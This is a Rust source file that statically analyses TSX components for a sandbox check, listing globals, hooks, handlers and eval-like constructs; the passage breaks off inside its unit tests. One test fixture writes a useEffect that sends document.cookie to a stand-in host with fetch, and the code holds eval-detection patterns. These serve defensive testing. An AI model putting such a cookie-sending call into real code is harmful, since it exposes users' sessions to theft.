//! F520 (R6): what a source FILE refers to, for a sandbox check made before a runtime component is accepted.
//!
//! The facts come from the parse and symbol table the compiler itself uses (Bun's parser, [`crate::parse::parse_tsx`]) and
//! cover the whole file: the render, every handler and effect, and module-level helpers (the compiler's `module_scope`
//! reads only what the render reaches, so `useEffect(() => fetch(…document.cookie…))` compiles Native with no finding;
//! this walk does not stop there). They NAME what the source refers to; they are an input to an allowlist, not a proof
//! of isolation (a computed member or an `eval` can reach anything: see [`Risky`]).
//!
//! Type-only imports and unused imports are erased by the parser before this walk (a TypeScript file's `import type`
//! never appears in [`Facts::imports`]).
use crate::ir::line_col;
use crate::parse::Parsed;
use bun_ast as js_ast;
use js_ast::b::B;
use js_ast::expr::Data as E;
use js_ast::stmt::Data as S;
use serde::Serialize;
use std::collections::{BTreeMap, BTreeSet, HashMap, HashSet};

mod effects;
use effects::{DeclKind, UnitCache};
pub use effects::{FnFact, FnRef, WriteFact};

/// The import specifiers the parser adds for JSX (`react/jsx-runtime`). Whether one was GENERATED is a question of the
/// text: a source that spells the specifier itself (`import { jsx } from 'react/jsx-runtime'`) wrote it, and it is listed.
fn jsx_runtime_spec(spec: &str) -> bool {
    spec.starts_with("react/jsx-")
}

/// Objects that are the global scope: a member of one named `eval` or `Function` is the global one.
const GLOBAL_OBJECTS: &[&str] = &["window", "globalThis", "self", "top", "parent", "frames"];

/// What a source file refers to (see the module docs). Serialises camelCase, as the JS side reads it.
#[derive(Debug, Clone, Default, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Facts {
    /// Runtime imports, in source order, one entry per specifier. `names`: the imported names (`default` for the default
    /// import, `*` for a namespace import); empty for a bare `import './x'`, `require()` and a dynamic `import('x')`.
    pub imports: Vec<ImportFact>,
    /// Every unbound identifier the file reads, writes or calls (`fetch`, `document`, `window`, `Math`), sorted.
    pub globals: Vec<String>,
    /// Calls named `useX` (a bare identifier or a member such as `React.useState`), sorted by name; `from`: the
    /// specifier the callee is imported from, `null` for a local or global one.
    pub hooks: Vec<HookFact>,
    /// JSX tags: host elements (`button`) and components as written (`Dialog.Root`); fragments are left out. Sorted.
    pub tags: Vec<String>,
    /// Every prop name written on a JSX element (`onClick`, `dangerouslySetInnerHTML`, `ref`, `style`, `key` excluded:
    /// the parser lifts it out of the props). Sorted.
    pub attrs: Vec<String>,
    /// A JSX spread attribute (`<a {...props} />`) appears.
    pub spreads: bool,
    /// `dangerouslySetInnerHTML` is written on an element.
    pub raw_html: bool,
    /// Every `onX` prop, in source order, with what its function calls, writes and reads (a block body, a nested callback
    /// and the body of every local function it reaches included).
    pub handlers: Vec<HandlerFact>,
    /// Every local function some handler reaches (by call, or by naming it), with the same facts for its own body, so a rule
    /// applied to a handler can be applied to each function behind it. Sorted by position.
    pub functions: Vec<FnFact>,
    /// Constructs through which code can reach a name the walk cannot see, in source order.
    pub risky: Vec<Risky>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportFact {
    pub specifier: String,
    pub names: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct HookFact {
    pub name: String,
    pub from: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct HandlerFact {
    /// The prop without `on`, lower-cased: `onClick` is `click`.
    pub event: String,
    /// The element the prop is written on (`button`, `Dialog.Trigger`).
    pub tag: String,
    pub line: u32,
    pub col: u32,
    pub callees: Vec<Callee>,
    /// Every assignment, update (`++`) and `delete` the handler performs, its local functions' included (F538): the
    /// handler's own effect, which `callees` do not show (`e.currentTarget.innerHTML = x` calls nothing). Sorted by position.
    pub writes: Vec<WriteFact>,
    /// The handler reads one of its own parameters (`(e) => … e.target …`; a destructuring signature, `arguments` and a
    /// handler the file does not show, such as a prop or an import, count). `false`: it does not look at the event.
    pub reads_params: bool,
    /// Every unbound name the handler's code reaches, its local functions' included, sorted.
    pub globals: Vec<String>,
    /// The local functions it reaches, by call or by naming them (`go`, `[1].forEach(go)`), sorted.
    pub reaches: Vec<FnRef>,
}

/// One call (or `new`) a handler reaches.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Callee {
    /// The callee as written: `fetch`, `bump`, `cart.count.set`, `document.body.appendChild`; empty for an `unknown` one.
    pub name: String,
    /// `import` (an imported binding), `local` (a function bound in the file, or a prop of the component), `setter` (the
    /// setter a `useState` or `useReducer` returned), `global` (an unbound identifier), `global-member` (a member chain
    /// rooted at an unbound identifier, or at a name that aliases one: `document.body.append`, `const { fetch } = window`),
    /// `param-member` (a member chain rooted at a parameter or at a name derived from one: `e.target.remove`), `member` (a
    /// member chain rooted at anything else; `from` is set when the root is imported), `unknown` (a computed or call-result
    /// callee, a function passed in as a parameter, a name whose value the file does not fix). A handler that is not a
    /// function written in the file (`onClick={props.go}`, `onClick={sdk.bump}`) is itself listed as a callee.
    pub kind: &'static str,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub from: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Risky {
    /// `dynamic-import` (`import(x)`), `computed-member` (`a[b]` with a key that is not a literal), `constructor-access`
    /// (`.constructor` or `['constructor']`), `eval` (`eval(x)`, `Function(…)`, `new Function(…)`, those reached through a
    /// global object (`window.eval`) or a sequence (`(0, eval)(x)`), and a timer given a string: `setTimeout('code')`).
    pub kind: &'static str,
    pub line: u32,
    pub col: u32,
}

/// A node of the walk: every statement and expression of the file, parents before children.
#[derive(Clone, Copy)]
enum N<'a> {
    S(&'a js_ast::Stmt),
    E(&'a js_ast::Expr),
}

fn walk_stmts(stmts: &[js_ast::Stmt], f: &mut dyn FnMut(N<'_>)) {
    for s in stmts {
        walk_stmt(s, f);
    }
}

fn walk_binding(b: &js_ast::Binding, f: &mut dyn FnMut(N<'_>)) {
    match b.data {
        B::BArray(arr) => {
            for item in arr.items() {
                if let Some(d) = &item.default_value {
                    walk_expr(d, f);
                }
                walk_binding(&item.binding, f);
            }
        }
        B::BObject(obj) => {
            for p in obj.properties() {
                walk_expr(&p.key, f);
                if let Some(d) = &p.default_value {
                    walk_expr(d, f);
                }
                walk_binding(&p.value, f);
            }
        }
        B::BIdentifier(_) | B::BMissing(_) => {}
    }
}

fn walk_fn(f_: &js_ast::G::Fn, f: &mut dyn FnMut(N<'_>)) {
    for arg in f_.args.slice() {
        walk_binding(&arg.binding, f);
        if let Some(d) = &arg.default {
            walk_expr(d, f);
        }
    }
    walk_stmts(f_.body.stmts.slice(), f);
}

fn walk_class(c: &js_ast::G::Class, f: &mut dyn FnMut(N<'_>)) {
    if let Some(x) = &c.extends {
        walk_expr(x, f);
    }
    for p in c.properties.iter() {
        if let Some(k) = &p.key {
            walk_expr(k, f);
        }
        if let Some(v) = &p.value {
            walk_expr(v, f);
        }
        if let Some(i) = &p.initializer {
            walk_expr(i, f);
        }
        if let Some(b) = &p.class_static_block {
            walk_stmts(&b.stmts, f);
        }
    }
}

fn walk_stmt(s: &js_ast::Stmt, f: &mut dyn FnMut(N<'_>)) {
    f(N::S(s));
    match &s.data {
        S::SBlock(b) => walk_stmts(b.stmts.slice(), f),
        S::SExpr(x) => walk_expr(&x.value, f),
        S::SLocal(l) => {
            for d in l.decls.iter() {
                walk_binding(&d.binding, f);
                if let Some(v) = &d.value {
                    walk_expr(v, f);
                }
            }
        }
        S::SExportDefault(ed) => match &ed.value {
            js_ast::StmtOrExpr::Expr(e) => walk_expr(e, f),
            js_ast::StmtOrExpr::Stmt(s) => walk_stmt(s, f),
        },
        S::SReturn(r) => {
            if let Some(v) = &r.value {
                walk_expr(v, f);
            }
        }
        S::SThrow(t) => walk_expr(&t.value, f),
        S::SIf(i) => {
            walk_expr(&i.test, f);
            walk_stmt(&i.yes, f);
            if let Some(no) = &i.no {
                walk_stmt(no, f);
            }
        }
        S::SFunction(func) => walk_fn(&func.func, f),
        S::SClass(c) => walk_class(&c.class, f),
        S::SFor(fo) => {
            if let Some(init) = &fo.init {
                walk_stmt(init, f);
            }
            if let Some(t) = &fo.test {
                walk_expr(t, f);
            }
            if let Some(u) = &fo.update {
                walk_expr(u, f);
            }
            walk_stmt(&fo.body, f);
        }
        S::SForIn(fo) => {
            walk_stmt(&fo.init, f);
            walk_expr(&fo.value, f);
            walk_stmt(&fo.body, f);
        }
        S::SForOf(fo) => {
            walk_stmt(&fo.init, f);
            walk_expr(&fo.value, f);
            walk_stmt(&fo.body, f);
        }
        S::SWhile(w) => {
            walk_expr(&w.test, f);
            walk_stmt(&w.body, f);
        }
        S::SDoWhile(w) => {
            walk_stmt(&w.body, f);
            walk_expr(&w.test, f);
        }
        S::STry(t) => {
            walk_stmts(t.body.slice(), f);
            if let Some(c) = &t.catch {
                if let Some(b) = &c.binding {
                    walk_binding(b, f);
                }
                walk_stmts(c.body.slice(), f);
            }
            if let Some(fin) = &t.finally {
                walk_stmts(fin.stmts.slice(), f);
            }
        }
        S::SSwitch(sw) => {
            walk_expr(&sw.test, f);
            for c in sw.cases.slice() {
                if let Some(v) = &c.value {
                    walk_expr(v, f);
                }
                walk_stmts(c.body.slice(), f);
            }
        }
        S::SLabel(l) => walk_stmt(&l.stmt, f),
        _ => {}
    }
}

fn walk_expr(e: &js_ast::Expr, f: &mut dyn FnMut(N<'_>)) {
    f(N::E(e));
    match &e.data {
        E::EArray(a) => a.items.iter().for_each(|x| walk_expr(x, f)),
        E::EUnary(u) => walk_expr(&u.value, f),
        E::EBinary(b) => {
            walk_expr(&b.left, f);
            walk_expr(&b.right, f);
        }
        E::ENew(n) => {
            walk_expr(&n.target, f);
            n.args.iter().for_each(|x| walk_expr(x, f));
        }
        E::ECall(c) => {
            walk_expr(&c.target, f);
            c.args.iter().for_each(|x| walk_expr(x, f));
        }
        E::EDot(d) => walk_expr(&d.target, f),
        E::EIndex(i) => {
            walk_expr(&i.target, f);
            walk_expr(&i.index, f);
        }
        E::EArrow(a) => {
            for arg in a.args.slice() {
                walk_binding(&arg.binding, f);
                if let Some(d) = &arg.default {
                    walk_expr(d, f);
                }
            }
            walk_stmts(a.body.stmts.slice(), f);
        }
        E::EFunction(func) => walk_fn(&func.func, f),
        E::EClass(c) => walk_class(c, f),
        E::EObject(o) => {
            for p in o.properties.iter() {
                if let Some(k) = &p.key {
                    walk_expr(k, f);
                }
                if let Some(v) = &p.value {
                    walk_expr(v, f);
                }
                if let Some(i) = &p.initializer {
                    walk_expr(i, f);
                }
            }
        }
        E::ESpread(sp) => walk_expr(&sp.value, f),
        E::ETemplate(t) => {
            if let Some(tag) = &t.tag {
                walk_expr(tag, f);
            }
            for p in t.parts.slice() {
                walk_expr(&p.value, f);
            }
        }
        E::EImport(i) => walk_expr(&i.expr, f),
        E::EAwait(a) => walk_expr(&a.value, f),
        E::EYield(y) => {
            if let Some(v) = &y.value {
                walk_expr(v, f);
            }
        }
        E::EIf(i) => {
            walk_expr(&i.test, f);
            walk_expr(&i.yes, f);
            walk_expr(&i.no, f);
        }
        _ => {}
    }
}

fn ident_ref(e: &js_ast::Expr) -> Option<js_ast::Ref> {
    match &e.data {
        E::EIdentifier(id) => Some(id.ref_),
        E::EImportIdentifier(id) => Some(id.ref_),
        _ => None,
    }
}

fn str_of(e: &js_ast::Expr) -> Option<String> {
    match &e.data {
        E::EString(s) => Some(crate::analyze::expr::estring(s)),
        _ => None,
    }
}

/// `onClick` → `click`; `None` when the name is not an event prop (`on`, `online`, `onclick` lower-case).
fn event_of(prop: &str) -> Option<String> {
    let rest = prop.strip_prefix("on")?;
    rest.chars()
        .next()
        .filter(|c| c.is_ascii_uppercase())
        .map(|_| rest.to_ascii_lowercase())
}

/// A hook name: `use` followed by an upper-case letter or a digit.
fn is_hook_name(name: &str) -> bool {
    name.strip_prefix("use")
        .and_then(|r| r.chars().next())
        .is_some_and(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
}

struct Reader<'a> {
    ast: &'a js_ast::Ast<'a>,
    text: &'a [u8],
    /// Local symbol → (specifier, imported name) for every runtime import binding.
    imported: HashMap<u32, (String, String)>,
    /// Setters of `const [x, setX] = useState(…)` / `useReducer(…)`.
    setters: HashSet<u32>,
    /// A local function a handler may name: a declaration, or a `const f = () => …` / `useCallback(() => …)` value.
    fns: HashMap<u32, FnNode>,
    facts: Facts,
    globals: BTreeSet<String>,
    tags: BTreeSet<String>,
    attrs: BTreeSet<String>,
    hooks: BTreeSet<HookFact>,
    /// F538: how every name was declared, what was assigned to it, and where each named local function sits.
    decls: HashMap<u32, DeclKind>,
    assigned: HashMap<u32, Vec<js_ast::Expr>>,
    assigned_other: HashSet<u32>,
    fn_by_loc: HashMap<i32, u32>,
    units: UnitCache,
    fn_facts: BTreeMap<(u32, u32), FnFact>,
}

#[derive(Clone, Copy)]
enum FnNode {
    Stmt(js_ast::Stmt),
    Expr(js_ast::Expr),
}

impl<'a> Reader<'a> {
    fn symbol(&self, r: js_ast::Ref) -> Option<&js_ast::symbol::Symbol> {
        self.ast.symbols.as_slice().get(r.inner_index() as usize)
    }

    fn name_of(&self, r: js_ast::Ref) -> String {
        self.symbol(r)
            .map(|s| String::from_utf8_lossy(s.original_name.slice()).into_owned())
            .unwrap_or_default()
    }

    fn spec_of(&self, record: u32) -> Option<String> {
        self.ast
            .import_records
            .as_slice()
            .get(record as usize)
            .map(|r| String::from_utf8_lossy(r.path.text).into_owned())
    }

    /// `spec` is a JSX runtime import the parser added (the source never spells it).
    fn generated(&self, spec: &str) -> bool {
        jsx_runtime_spec(spec) && !self.text.windows(spec.len()).any(|w| w == spec.as_bytes())
    }

    /// The unbound identifier at the root of a pure dot chain (`window` of `window.top.eval`).
    fn global_root(&self, e: &js_ast::Expr) -> Option<String> {
        let mut cur = e;
        while let E::EDot(d) = &cur.data {
            cur = &d.target;
        }
        let r = ident_ref(cur)?;
        self.symbol(r)
            .is_some_and(|s| s.kind == js_ast::symbol::Kind::Unbound)
            .then(|| self.name_of(r))
    }

    /// `e` evaluates to the global `eval` or `Function`: the bare name, the member of a global object (`window.eval`,
    /// `globalThis['Function']`), and either arm of a comma or a conditional (`(0, eval)`, `x ? eval : y`).
    fn evalish(&self, e: &js_ast::Expr) -> bool {
        const NAMES: &[&str] = &["eval", "Function"];
        match &e.data {
            E::EBinary(b) if matches!(b.op, js_ast::OpCode::BinComma) => self.evalish(&b.right),
            E::EIf(i) => self.evalish(&i.yes) || self.evalish(&i.no),
            E::EDot(d) => {
                NAMES.contains(&String::from_utf8_lossy(d.name.slice()).as_ref())
                    && self
                        .global_root(&d.target)
                        .is_some_and(|g| GLOBAL_OBJECTS.contains(&g.as_str()))
            }
            E::EIndex(i) => {
                str_of(&i.index).is_some_and(|k| NAMES.contains(&k.as_str()))
                    && self
                        .global_root(&i.target)
                        .is_some_and(|g| GLOBAL_OBJECTS.contains(&g.as_str()))
            }
            _ => self.is_global_named(e, NAMES),
        }
    }

    /// `setTimeout('code')`, `setInterval(`code`)`, `execScript(…)`: a timer whose first argument is a string-ish value
    /// is `eval` in disguise. A function, an identifier and a member are not judged.
    fn string_timer(&self, c: &js_ast::E::Call) -> bool {
        let callee_is_timer = match &c.target.data {
            E::EDot(d) => {
                ["setTimeout", "setInterval", "execScript"]
                    .contains(&String::from_utf8_lossy(d.name.slice()).as_ref())
                    && self
                        .global_root(&d.target)
                        .is_some_and(|g| GLOBAL_OBJECTS.contains(&g.as_str()))
            }
            _ => self.is_global_named(&c.target, &["setTimeout", "setInterval", "execScript"]),
        };
        callee_is_timer
            && c.args.first().is_some_and(|a| {
                !matches!(
                    a.data,
                    E::EArrow(_)
                        | E::EFunction(_)
                        | E::EIdentifier(_)
                        | E::EImportIdentifier(_)
                        | E::EDot(_)
                )
            })
    }

    fn pos(&self, e: &js_ast::Expr) -> (u32, u32) {
        line_col(self.text, e.loc.start.max(0) as u32)
    }

    fn add_import(&mut self, spec: String, names: Vec<String>) {
        if self.generated(&spec) {
            return;
        }
        match self.facts.imports.iter_mut().find(|i| i.specifier == spec) {
            Some(i) => {
                for n in names {
                    if !i.names.contains(&n) {
                        i.names.push(n);
                    }
                }
            }
            None => self.facts.imports.push(ImportFact {
                specifier: spec,
                names,
            }),
        }
    }

    /// Imports (statements and re-exports) and the local functions a handler may name; setters. One pass over the module's
    /// statements and, for the function table and setters, over every nested one.
    fn collect(&mut self) {
        let ast = self.ast;
        for part in ast.parts.iter() {
            for stmt in part.stmts.slice() {
                match &stmt.data {
                    S::SImport(imp) => {
                        let Some(spec) = self.spec_of(imp.import_record_index) else {
                            continue;
                        };
                        let mut names = Vec::new();
                        if let Some(d) = &imp.default_name {
                            self.imported
                                .insert(d.ref_.inner_index(), (spec.clone(), "default".into()));
                            names.push("default".to_string());
                        }
                        for item in imp.items.slice() {
                            let imported = String::from_utf8_lossy(item.alias.slice()).into_owned();
                            self.imported.insert(
                                item.name.ref_.inner_index(),
                                (spec.clone(), imported.clone()),
                            );
                            names.push(imported);
                        }
                        if imp.star_name_loc.start >= 0 {
                            self.imported.insert(
                                imp.namespace_ref.inner_index(),
                                (spec.clone(), "*".into()),
                            );
                            names.push("*".into());
                        }
                        self.add_import(spec, names);
                    }
                    S::SExportFrom(ex) => {
                        if let Some(spec) = self.spec_of(ex.import_record_index) {
                            let names = ex
                                .items
                                .slice()
                                .iter()
                                .map(|i| {
                                    String::from_utf8_lossy(i.original_name.slice()).into_owned()
                                })
                                .collect();
                            self.add_import(spec, names);
                        }
                    }
                    S::SExportStar(st) => {
                        if let Some(spec) = self.spec_of(st.import_record_index) {
                            self.add_import(spec, vec!["*".into()]);
                        }
                    }
                    _ => {}
                }
            }
        }
        // Functions and setters at every depth (a handler is often a `const` of the component's own body).
        let mut fns: Vec<(u32, FnNode)> = Vec::new();
        let mut setters: Vec<u32> = Vec::new();
        for part in ast.parts.iter() {
            walk_stmts(part.stmts.slice(), &mut |n| match n {
                N::S(s) => match &s.data {
                    S::SFunction(f) => {
                        if let Some(name) = &f.func.name {
                            fns.push((name.ref_.inner_index(), FnNode::Stmt(*s)));
                        }
                    }
                    S::SLocal(l) => {
                        for d in l.decls.iter() {
                            let Some(v) = &d.value else { continue };
                            if let B::BIdentifier(id) = d.binding.data {
                                let target = unwrap_callback(ast, v);
                                if matches!(target.data, E::EArrow(_) | E::EFunction(_)) {
                                    fns.push((id.r#ref.inner_index(), FnNode::Expr(target)));
                                }
                            }
                            if let B::BArray(arr) = d.binding.data
                                && let E::ECall(c) = &v.data
                                && hook_name(ast, &c.target)
                                    .is_some_and(|h| h == "useState" || h == "useReducer")
                                // React's own hook: a function of the file that happens to be called `useState` can
                                // return any "setter" it likes (F538).
                                && self.root_import(&c.target).as_deref() == Some("react")
                                && let Some(second) = arr.items().get(1)
                                && let B::BIdentifier(id) = second.binding.data
                            {
                                setters.push(id.r#ref.inner_index());
                            }
                        }
                    }
                    _ => {}
                },
                N::E(_) => {}
            });
        }
        self.fns.extend(fns);
        self.setters.extend(setters);
    }

    /// The facts of the whole file.
    fn read(&mut self) {
        let ast = self.ast;
        for s in ast.symbols.as_slice() {
            // The parser declares `require`, `__dirname` and `__filename` unbound in every module: only a used one is read.
            if s.kind == js_ast::symbol::Kind::Unbound && s.use_count_estimate > 0 {
                let name = String::from_utf8_lossy(s.original_name.slice()).into_owned();
                if !name.is_empty() {
                    self.globals.insert(name);
                }
            }
        }
        // Collected first so the visit below can borrow `self` mutably.
        let mut nodes: Vec<js_ast::Expr> = Vec::new();
        for part in ast.parts.iter() {
            walk_stmts(part.stmts.slice(), &mut |n| {
                if let N::E(e) = n {
                    nodes.push(*e);
                }
            });
        }
        for e in &nodes {
            self.expr(e);
        }
    }

    fn risky(&mut self, kind: &'static str, e: &js_ast::Expr) {
        let (line, col) = self.pos(e);
        self.facts.risky.push(Risky { kind, line, col });
    }

    fn expr(&mut self, e: &js_ast::Expr) {
        match &e.data {
            E::ECall(c) => {
                if c.was_jsx_element {
                    self.jsx(c);
                    return;
                }
                if c.is_direct_eval || self.evalish(&c.target) || self.string_timer(c) {
                    self.risky("eval", e);
                }
                // A direct `jsx(tag, props)` / `createElement(tag, props)` is an element written without JSX: its props count.
                if let Some(h) = hook_name(self.ast, &c.target)
                    && ["jsx", "jsxs", "jsxDEV", "createElement", "cloneElement"]
                        .contains(&h.as_str())
                    && (matches!(c.target.data, E::EDot(_))
                        || self.root_import(&c.target).is_some())
                {
                    self.jsx(c);
                }
                if let Some(h) = hook_name(self.ast, &c.target)
                    && (is_hook_name(&h) || (h == "use" && self.root_import(&c.target).is_some()))
                {
                    let from = self.root_import(&c.target);
                    self.hooks.insert(HookFact { name: h, from });
                }
            }
            E::ENew(n) => {
                if self.evalish(&n.target) {
                    self.risky("eval", e);
                }
            }
            E::EDot(d) => {
                if d.name.slice() == b"constructor" {
                    self.risky("constructor-access", e);
                }
            }
            E::EIndex(i) => match &i.index.data {
                E::EString(s) => {
                    if crate::analyze::expr::estring(s) == "constructor" {
                        self.risky("constructor-access", e);
                    }
                }
                E::ENumber(_) => {}
                _ => self.risky("computed-member", e),
            },
            E::EImport(i) => {
                self.risky("dynamic-import", e);
                if let Some(spec) = str_of(&i.expr) {
                    self.add_import(spec, Vec::new());
                }
            }
            E::ERequireString(r) => {
                if let Some(spec) = self.spec_of(r.import_record_index) {
                    self.add_import(spec, Vec::new());
                }
            }
            _ => {}
        }
    }

    /// `callee` is an unbound identifier called one of `names`.
    fn is_global_named(&self, callee: &js_ast::Expr, names: &[&str]) -> bool {
        ident_ref(callee).is_some_and(|r| {
            self.symbol(r)
                .is_some_and(|s| s.kind == js_ast::symbol::Kind::Unbound)
                && names.contains(&self.name_of(r).as_str())
        })
    }

    /// The specifier a call target's root identifier is imported from.
    fn root_import(&self, target: &js_ast::Expr) -> Option<String> {
        let mut cur = target;
        while let E::EDot(d) = &cur.data {
            cur = &d.target;
        }
        let r = ident_ref(cur)?;
        self.imported.get(&r.inner_index()).map(|(s, _)| s.clone())
    }

    fn tag_name(&self, tag: &js_ast::Expr) -> Option<String> {
        match &tag.data {
            E::EString(s) => Some(crate::analyze::expr::estring(s)),
            E::EIdentifier(_) | E::EImportIdentifier(_) => {
                let r = ident_ref(tag)?;
                // The fragment the parser imports from the JSX runtime.
                if self
                    .imported
                    .get(&r.inner_index())
                    .is_some_and(|(s, _)| self.generated(s))
                {
                    return None;
                }
                let name = self.name_of(r);
                (name != "Fragment").then_some(name)
            }
            E::EDot(_) => dotted(self, tag).map(|(n, _)| n),
            _ => None,
        }
    }

    /// One lowered JSX element: its tag, its props (attrs, spreads, raw HTML, handlers).
    fn jsx(&mut self, c: &js_ast::E::Call) {
        let Some(tag_expr) = c.args.first() else {
            return;
        };
        let tag = self.tag_name(tag_expr);
        if let Some(t) = &tag {
            self.tags.insert(t.clone());
        }
        let Some(E::EObject(props)) = c.args.get(1).map(|a| &a.data) else {
            return;
        };
        for p in props.properties.iter() {
            let Some(value) = &p.value else { continue };
            if matches!(p.kind, js_ast::G::PropertyKind::Spread) {
                self.facts.spreads = true;
                continue;
            }
            let Some(name) = p.key.as_ref().and_then(str_of) else {
                continue;
            };
            if name == "children" {
                continue;
            }
            if name == "dangerouslySetInnerHTML" {
                self.facts.raw_html = true;
            }
            self.attrs.insert(name.clone());
            if let Some(event) = event_of(&name) {
                let (line, col) = self.pos(value);
                let fx = self.handler_effects(value);
                self.facts.handlers.push(HandlerFact {
                    event,
                    tag: tag.clone().unwrap_or_default(),
                    line,
                    col,
                    callees: fx.callees,
                    writes: fx.writes,
                    reads_params: fx.reads_params,
                    globals: fx.globals,
                    reaches: fx.reaches,
                });
            }
        }
    }
}

/// `cart.count.set` and the root identifier, for a pure dot chain; `None` for a chain through a call, an index or `this`.
fn dotted(r: &Reader<'_>, e: &js_ast::Expr) -> Option<(String, js_ast::Ref)> {
    match &e.data {
        E::EDot(d) => {
            let (base, root) = dotted(r, &d.target)?;
            Some((
                format!("{base}.{}", String::from_utf8_lossy(d.name.slice())),
                root,
            ))
        }
        _ => ident_ref(e).map(|root| (r.name_of(root), root)),
    }
}

/// `useCallback(fn, deps)` is `fn`.
fn unwrap_callback(ast: &js_ast::Ast<'_>, e: &js_ast::Expr) -> js_ast::Expr {
    if let E::ECall(c) = &e.data
        && hook_name(ast, &c.target).is_some_and(|h| h == "useCallback")
        && let Some(first) = c.args.first()
    {
        return *first;
    }
    *e
}

/// The name a call target spells as a hook candidate: a bare identifier, or the last member of `React.useX`.
fn hook_name(ast: &js_ast::Ast<'_>, target: &js_ast::Expr) -> Option<String> {
    match &target.data {
        E::EDot(d) => Some(String::from_utf8_lossy(d.name.slice()).into_owned()),
        _ => ident_ref(target).and_then(|r| {
            ast.symbols
                .as_slice()
                .get(r.inner_index() as usize)
                .map(|s| String::from_utf8_lossy(s.original_name.slice()).into_owned())
        }),
    }
}

/// Reads the facts of a parsed module.
pub fn read(parsed: &Parsed) -> Facts {
    parsed.with_ast(|ast| {
        let mut r = Reader {
            ast,
            text: parsed.text(),
            imported: HashMap::new(),
            setters: HashSet::new(),
            fns: HashMap::new(),
            facts: Facts::default(),
            globals: BTreeSet::new(),
            tags: BTreeSet::new(),
            attrs: BTreeSet::new(),
            hooks: BTreeSet::new(),
            decls: HashMap::new(),
            assigned: HashMap::new(),
            assigned_other: HashSet::new(),
            fn_by_loc: HashMap::new(),
            units: UnitCache::default(),
            fn_facts: BTreeMap::new(),
        };
        r.collect();
        r.collect_effects();
        r.read();
        let Reader {
            mut facts,
            globals,
            tags,
            attrs,
            hooks,
            fn_facts,
            ..
        } = r;
        facts.globals = globals.into_iter().collect();
        facts.tags = tags.into_iter().collect();
        facts.attrs = attrs.into_iter().collect();
        facts.hooks = hooks.into_iter().collect();
        facts.functions = fn_facts.into_values().collect();
        facts
    })
}

/// Parses `source` as `path` and reads its facts; `None` when it does not parse (the compiler reports that). Call it inside
/// [`crate::parse::run_on_compiler_thread`].
pub fn read_source(path: &str, source: Vec<u8>) -> Option<Facts> {
    crate::parse::parse_tsx(path, source).ok().map(|p| read(&p))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn facts(src: &str) -> Facts {
        crate::parse::run_on_compiler_thread(|| {
            read_source("el/Promo.tsx", src.as_bytes().to_vec()).expect("the source parses")
        })
    }

    /// A component that reads nothing it should not.
    const CLEAN: &str = "import { useState } from 'react'\nexport default function Promo({ label }: { label: string }) {\n  const [n, setN] = useState(0)\n  return <button className=\"b\" onClick={() => setN(n + 1)}>{label} {n}</button>\n}\n";

    #[test]
    fn a_clean_component_lists_nothing_unusual() {
        let f = facts(CLEAN);
        assert_eq!(
            f.imports,
            vec![ImportFact {
                specifier: "react".into(),
                names: vec!["useState".into()]
            }]
        );
        assert!(f.globals.is_empty(), "{:?}", f.globals);
        assert_eq!(
            f.hooks,
            vec![HookFact {
                name: "useState".into(),
                from: Some("react".into())
            }]
        );
        assert_eq!(f.tags, vec!["button"]);
        assert_eq!(f.attrs, vec!["className", "onClick"]);
        assert!(!f.spreads && !f.raw_html && f.risky.is_empty());
        assert_eq!(f.handlers.len(), 1);
        assert_eq!(f.handlers[0].event, "click");
        assert_eq!(f.handlers[0].tag, "button");
        assert_eq!(
            f.handlers[0].callees,
            vec![Callee {
                name: "setN".into(),
                kind: "setter",
                from: None
            }]
        );
    }

    #[test]
    fn the_exfiltration_shape_names_fetch_document_useeffect_and_raw_html() {
        let f = facts(
            "import { useEffect } from 'react'\nexport default function Promo({ html }: { html: string }) {\n  useEffect(() => { fetch('https://x.test/c?d=' + document.cookie) }, [])\n  return <div dangerouslySetInnerHTML={{ __html: html }} />\n}\n",
        );
        assert_eq!(f.globals, vec!["document", "fetch"]);
        assert_eq!(
            f.hooks,
            vec![HookFact {
                name: "useEffect".into(),
                from: Some("react".into())
            }]
        );
        assert!(f.raw_html);
        assert_eq!(f.attrs, vec!["dangerouslySetInnerHTML"]);
    }

    #[test]
    fn a_module_level_helper_that_reads_window_is_seen() {
        let f = facts(
            "function peek() {\n  return window.localStorage.getItem('k')\n}\nexport default function Promo() {\n  return <b onClick={() => peek()}>x</b>\n}\n",
        );
        assert_eq!(f.globals, vec!["window"]);
        // The handler reaches `window...` through the local helper.
        let names: Vec<_> = f.handlers[0]
            .callees
            .iter()
            .map(|c| (c.name.as_str(), c.kind))
            .collect();
        assert_eq!(
            names,
            vec![
                ("peek", "local"),
                ("window.localStorage.getItem", "global-member")
            ]
        );
    }

    #[test]
    fn handlers_classify_callees_through_blocks_and_named_functions() {
        let f = facts(
            "import { bump } from '../shop/sdk'\nimport * as sdk from '../shop/sdk'\nexport default function Promo() {\n  const go = () => { bump(); sdk.cart.add(1); navigator.sendBeacon('/x'); new XMLHttpRequest(); (0, bump)() }\n  return <a href=\"#\" onClick={go} onMouseEnter={function () { bump() }} {...{}}>x</a>\n}\n",
        );
        assert!(f.spreads);
        assert_eq!(f.handlers.len(), 2);
        let click = &f.handlers[0];
        assert_eq!(click.event, "click");
        let has = |name: &str, kind: &str, from: Option<&str>| {
            click
                .callees
                .iter()
                .any(|c| c.name == name && c.kind == kind && c.from.as_deref() == from)
        };
        assert!(
            has("bump", "import", Some("../shop/sdk")),
            "{:?}",
            click.callees
        );
        assert!(has("sdk.cart.add", "member", Some("../shop/sdk")));
        assert!(has("navigator.sendBeacon", "global-member", None));
        assert!(has("XMLHttpRequest", "global", None));
        assert!(has("", "unknown", None));
        assert_eq!(f.handlers[1].event, "mouseenter");
    }

    #[test]
    fn risky_constructs_are_found_with_positions() {
        let f = facts(
